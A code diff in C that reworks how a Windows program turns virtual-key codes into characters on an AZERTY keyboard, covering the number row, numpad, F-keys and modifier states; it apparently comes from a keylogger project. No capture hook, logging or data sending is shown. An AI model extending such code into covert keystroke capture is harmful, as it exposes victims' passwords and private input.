@@ -13,28 +13,65 @@ char *translate_key(DWORD vkCode)
             vkCode += 32;
         char key_char = (char)vkCode;
         sprintf(key, "%c", key_char);
-        return key;
     }
-    if (vkCode >= VK_NUMPAD0 && vkCode <= VK_DIVIDE)
-        return n_pad(vkCode);
-    printf("%d ", vkCode);
+    else if (vkCode >= 48 && vkCode <= 57)
+        key = number(vkCode);
+    else if (vkCode >= VK_LBUTTON && vkCode <= 7)
+        key = "";
+    else if (vkCode >= VK_NUMPAD0 && vkCode <= VK_DIVIDE)
+        key = n_pad(vkCode);
+    else if (vkCode >= VK_F1 && vkCode <= VK_F24)
+        key = f_key(vkCode);
+    else
+    {
+        printf("%d", vkCode);
+        key = other(vkCode);
+    }
     return key;
 }
 
-static const char *number[] = {
-    "à", "&", "é", "\"", "'", "(", "-", "è", "_", "ç"};
-static const char *number_shifted[] = {
-    "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"};
+char *n_pad(DWORD vkCode)
+{
+    char *key[] = {
+        "0", "1", "2", "3", "4", "5",
+        "6", "7", "8", "9", "*", "+",
+        "-", "-", ".", "/"};
+    return key[vkCode - VK_NUMPAD0];
+}
 
-static const char *number_algr[] = {
-    "@", UK, "~", "#", "{", "[", "|", "`", "\\", "^"};
+char *f_key(DWORD vkCode)
+{
+    char *key[] = {
+        "[F1]", "[F2]", "[F3]", "[F4]", "[F5]", "[F6]",
+        "[F7]", "[F8]", "[F9]", "[F10]", "[F11]", "[F12]",
+        "[F13]", "[F14]", "[F15]", "[F16]", "[F17]", "[F18]",
+        "[F19]", "[F20]", "[F21]", "[F22]", "[F23]", "[F24]"};
 
-static const char *f_key[] = {
-    "[F1]", "[F2]", "[F3]", "[F4]", "[F5]", "[F6]", "[F7]",
-    "[F8]", "[F9]", "[F10]", "[F11]", "[F12]"};
+    return key[vkCode - VK_F1];
+}
 
+char *number(DWORD vkCode)
+{
+    char *number[] = {
+        "à", "&", "é", "\"", "'", "(", "-", "è", "_", "ç"};
+    char *number_shifted[] = {
+        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"};
 
+    char *number_algr[] = {
+        "@", UK, "~", "#", "{", "[", "|", "`", "\\", "^"};
 
+    if (isCapsLock() || isShiftLock())
+        return number_shifted[vkCode - 48];
+    if (isAltgrLock())
+        return number_algr[vkCode - 48];
+    else
+        return number[vkCode - 48];
+}
+
+char *other(DWORD vkCode)
+{
+    return UK;
+}
 
 const int isCapsLock(void)
 {
@@ -46,43 +83,7 @@ const int isAltgrLock(void)
     return (GetKeyState(VK_RMENU) < 0 && GetKeyState(VK_LCONTROL) < 0);
 }
 
-const char *n_pad(DWORD vkCode)
+const int isShiftLock(void)
 {
-    switch (vkCode)
-    {
-    case VK_NUMPAD0:
-        return "0";
-    case VK_NUMPAD1:
-        return "1";
-    case VK_NUMPAD2:
-        return "2";
-    case VK_NUMPAD3:
-        return "3";
-    case VK_NUMPAD4:
-        return "4";
-    case VK_NUMPAD5:
-        return "5";
-    case VK_NUMPAD6:
-        return "6";
-    case VK_NUMPAD7:
-        return "7";
-    case VK_NUMPAD8:
-        return "8";
-    case VK_NUMPAD9:
-        return "9";
-    case VK_MULTIPLY:
-        return "*";
-    case VK_ADD:
-        return "+";
-    case VK_SEPARATOR:
-        return "-";
-    case VK_SUBTRACT:
-        return "-";
-    case VK_DECIMAL:
-        return ".";
-    case VK_DIVIDE:
-        return "/";
-    default:
-        return UK;
-    }
+    return GetKeyState(VK_SHIFT) < 0;
 }
